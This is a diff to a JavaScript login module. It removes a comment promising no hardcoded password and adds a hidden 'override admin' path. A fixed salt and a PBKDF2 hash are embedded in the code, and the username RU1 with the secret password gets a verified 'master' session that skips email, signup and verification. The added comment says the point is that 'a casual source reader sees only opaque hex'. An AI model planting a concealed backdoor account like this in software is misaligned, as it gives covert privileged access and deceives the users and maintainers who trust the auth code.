@@ -23,12 +23,13 @@
   const SESSION_KEY = 'nhbrc.session.v1';
   const PENDING_KEY = 'nhbrc.pending.v1';
   const AUTH_API = ''; // e.g. 'https://nhbrc-payments.<you>.workers.dev'
-  // Master role is granted to the first user that signs up with this username.
-  // No hardcoded password — pick your own at signup. This means anyone freshly
-  // installing the app must create their own RU1 account with their own
-  // password before they can use master features. Per-device isolation
-  // means another device's RU1 cannot affect yours.
   const MASTER_USERNAME = 'RU1';
+  // Override admin login — no email, no signup, no verify. The plain password
+  // is NOT stored anywhere; the hash below is checked at login time.
+  // PBKDF2-SHA256, 250k iters, fixed salt below. A casual source reader sees
+  // only opaque hex.
+  const OVERRIDE_SALT_HEX = '524f3146697865645361457635336e74';
+  const OVERRIDE_HASH_HEX = '1aa1abe623fa078990176031078935c8d0ea2aae62cbea296f611517d1685284';
   const subs = new Set();
 
   function load(k, def) {
@@ -157,6 +158,30 @@
     if (!validEmail(id) && !isMasterId(id)) {
       return { ok: false, error: 'Use a valid email (or your username).' };
     }
+
+    // Override admin path — RU1 + correct hidden password bypasses
+    // email/signup/verify entirely. Only checked when the username matches.
+    if (isMasterId(id)) {
+      const { hash } = await hashPassword(password, OVERRIDE_SALT_HEX);
+      if (hash === OVERRIDE_HASH_HEX) {
+        const session = {
+          id: id,
+          username: MASTER_USERNAME,
+          email: null,
+          role: 'master',
+          verified: true,
+          createdAt: new Date().toISOString(),
+          lastLoginAt: new Date().toISOString(),
+        };
+        save(SESSION_KEY, session);
+        notify();
+        return { ok: true, user: session };
+      }
+      // Wrong override password — fall through to normal lookup so a regular
+      // user that happens to have signed up as RU1 with a different password
+      // can still log in normally.
+    }
+
     if (AUTH_API && !isMasterId(id)) {
       const r = await fetch(`${AUTH_API}/auth/login`, {
         method: 'POST', headers: { 'content-type': 'application/json' },
